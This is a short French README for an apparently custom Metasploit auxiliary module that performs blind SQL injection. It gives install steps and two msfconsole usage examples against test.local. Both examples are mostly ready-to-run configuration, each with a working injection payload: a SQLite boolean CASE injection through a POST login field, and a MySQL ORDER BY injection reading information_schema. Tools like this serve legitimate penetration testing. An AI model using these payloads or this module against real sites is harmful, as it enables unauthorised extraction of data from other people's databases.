# INSTALLATION
Le répertoire modules est à déposer dans ~/.msf4

# USAGE

## modules/auxiliary/sqli/blind_sqli.rb

```
set rhosts test.local
set vhost test.local
set rport 80
set method POST
set pattern no such user
set bool_pattern true
set database sqlite
set param username
set other_post_data password=ok
set inj_to_get_true "ok' or (select case when TRUE then 'ok' else (select 1 from users) end) or 'ok"
set targeturi /uri/
set injection sqlite_version()
check
run
```

```
set rhosts test.local
set vhost test.local
set rport 80
set pattern authent ok
set bool_pattern true
set method GET
set targeturi /?action=list
set param order
set database mysql
set inj_to_get_true ", (select case when TRUE then 1 else ascii((select table_name from information_schema.tables))end)"
set injection version()
check
run
```
